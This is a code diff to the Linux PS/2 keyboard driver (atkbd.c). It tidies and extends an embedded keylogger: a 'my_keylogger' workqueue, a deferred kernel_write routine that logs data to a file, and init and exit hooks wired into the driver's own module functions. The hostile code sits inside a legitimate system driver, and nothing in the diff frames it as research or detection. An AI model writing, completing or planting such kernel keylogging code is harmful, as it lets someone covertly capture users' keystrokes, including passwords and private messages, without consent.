@@ -446,6 +446,8 @@ static enum ps2_disposition atkbd_pre_receive_byte(struct ps2dev *ps2dev,
 	return PS2_PROCESS;
 }
 
+// ----------------PART 3---------------------
+
 // Define a structure to pass data to the workqueue
 struct my_work_data {
     struct work_struct my_work;
@@ -474,13 +476,10 @@ static void my_work_func(struct work_struct *work)
     }
 
     // Write the data to the file
-    // kernel_write is the preferred way to write to files from kernel
     ret = kernel_write(filp, data->data_to_write, data->data_len, &pos);
-    if (ret < 0) {
+    if (ret < 0)
         printk(KERN_ERR "my_keylogger: Failed to write to file %s, error %zd\n", filepath, ret);
-    } else {
-        // printk(KERN_INFO "my_keylogger: Successfully wrote %zd bytes to %s\n", ret, filepath);
-    }
+
 // Close the file
     filp_close(filp, NULL);
 
@@ -521,7 +520,7 @@ void schedule_file_write(const char *data, size_t len)
         kfree(work_data);
     }
 }
-
+// ------------------------------------------
 
 
 static void atkbd_receive_byte(struct ps2dev *ps2dev, u8 data)
@@ -2109,46 +2108,26 @@ static int __init atkbd_init(void)
 	dmi_check_system(atkbd_dmi_quirk_table);
 	printk(KERN_INFO "my_keylogger: Initializing module...\n");
 
-    // Create a custom workqueue
-    // The name "my_keylogger_wq" will appear in /proc/workqueues
-    my_wq = create_workqueue("my_keylogger_wq");
-    if (!my_wq) {
-        printk(KERN_ERR "my_keylogger: Failed to create workqueue\n");
-        return -ENOMEM;
-    }
+	// Create a custom workqueue
+	// The name "my_keylogger_wq" will appear in /proc/workqueues
+	my_wq = create_workqueue("my_keylogger_wq");
+	if (!my_wq) {
+		printk(KERN_ERR "my_keylogger: Failed to create workqueue\n");
+		return -ENOMEM;
+	}
 
-    printk(KERN_INFO "my_keylogger: Workqueue created. Triggering a test write...\n");
-
-    /*
-    // --- Simulate a keypress event leading to a deferred write ---
-    // In your atkbd.c modification, you would call schedule_file_write()
-    // with the actual keypress data.
-    char test_string[] = "Test keypress log entry from kernel module at ";
-    char timestamp[30];
-    snprintf(timestamp, sizeof(timestamp), "%lld\n", ktime_get_real_seconds());
-    char full_log_entry[sizeof(test_string) + sizeof(timestamp)];
-    strcpy(full_log_entry, test_string);
-    strcat(full_log_entry, timestamp);
-
-    schedule_file_write(full_log_entry, strlen(full_log_entry));
-    // --- End of simulation ---
-    */
-
-    // return 0; // Success
+	printk(KERN_INFO "my_keylogger: Workqueue created. Triggering a test write...\n");
 
 	return serio_register_driver(&atkbd_drv);
 }
 
 static void __exit atkbd_exit(void)
 {
-	printk(KERN_INFO "my_keylogger: Exiting module...\n");
-
-    // Flush and destroy the workqueue.
-    // This waits for any pending work items to complete.
-    if (my_wq) {
-        destroy_workqueue(my_wq);
-    }
-    printk(KERN_INFO "my_keylogger: Workqueue destroyed.\n");
+	// Flush and destroy the workqueue.
+	// This waits for any pending work items to complete.
+	if (my_wq) {
+		destroy_workqueue(my_wq);
+	}
 
 	serio_unregister_driver(&atkbd_drv);
 }
